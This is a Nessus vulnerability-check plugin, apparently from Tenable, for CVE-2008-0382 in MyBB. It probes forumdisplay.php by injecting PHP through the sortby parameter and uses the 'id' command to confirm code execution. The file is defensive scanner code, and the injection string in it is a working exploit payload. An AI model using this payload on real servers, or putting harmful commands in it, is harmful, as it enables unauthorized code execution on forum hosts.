#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(29996);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2008-0382");
  script_bugtraq_id(27322);
  script_xref(name:"OSVDB", value:"42800");

  script_name(english:"MyBB forumdisplay.php sortby Parameter Arbitrary PHP Code Execution");
  script_summary(english:"Tries to run a command via MyBB");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The version of MyBB installed on the remote host fails to sanitize
input to the 'sortby' parameter of the 'forumdisplay.php' script
before using it in an 'eval()' statement to evaluate PHP code.  An
unauthenticated attacker can leverage this issue to execute arbitrary
code on the remote host subject to the privileges of the web server
user id. 

There is also reportedly a similar issue affecting the 'search.php'
script when the 'action' parameter is set to 'results', although
Nessus did not actually test for it." );
 script_set_attribute(attribute:"see_also", value:"http://www.waraxe.us/advisory-61.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/486434/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://community.mybboard.net/showthread.php?tid=27227" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to MyBB 1.2.11 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("mybb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/mybb"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # We need a valid forum id.
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) exit(0);

  fid = NULL;
  pat = 'forumdisplay\\.php\\?fid=([0-9]+)';
  matches = egrep(pattern:pat, string:res);
  if (matches)
  {
    foreach match (split(matches))
    {
      match = chomp(match);
      item = eregmatch(pattern:pat, string:match);
      if (!isnull(item))
      {
        fid = item[1];
        break;
      }
    }
  }
  if (isnull(fid))
  {
    exit(0, "could not find a forum id to use");
  }

  cmd = "id";
  exploit = string(
    "/forumdisplay.php?",
    "fid=", fid, "&",
    "sortby='];system(", cmd, ");exit;//"
  );
  http_check_remote_code(
    unique_dir    : dir,
    check_request : exploit,
    check_result  : "uid=[0-9]+.*gid=[0-9]+.*",
    command       : cmd,
    port          : port
  );
}
